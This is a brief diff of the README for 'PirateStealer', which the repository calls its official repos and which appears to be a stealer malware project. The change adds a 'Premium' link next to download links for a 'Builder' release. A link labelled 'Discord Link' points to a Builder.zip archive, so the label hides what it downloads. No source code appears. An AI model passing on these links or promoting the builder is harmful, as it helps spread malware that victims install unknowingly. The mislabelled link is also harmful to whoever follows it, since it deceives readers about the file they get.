@@ -1,4 +1,5 @@
-## [🔗 Discord Link](https://github.com/Stanley-PirateStealer/PirateStealer-GitHub/releases/download/builder/Builder.zip) - [🔨 Builder](https://github.com/Stanley-PirateStealer/PirateStealer-GitHub/releases/tag/builder) 
+## [🔗 Discord Link](https://github.com/Stanley-PirateStealer/PirateStealer-GitHub/releases/download/builder/Builder.zip) - [🔨 Builder](https://github.com/Stanley-PirateStealer/PirateStealer-GitHub/releases/tag/builder) - [💎 Premium](https://github.com/Stanley-PirateStealer/PirateStealer-GitHub/files/7702161/Premium.txt)
+
 # PirateStealer
 Official PirateStealer repos
 
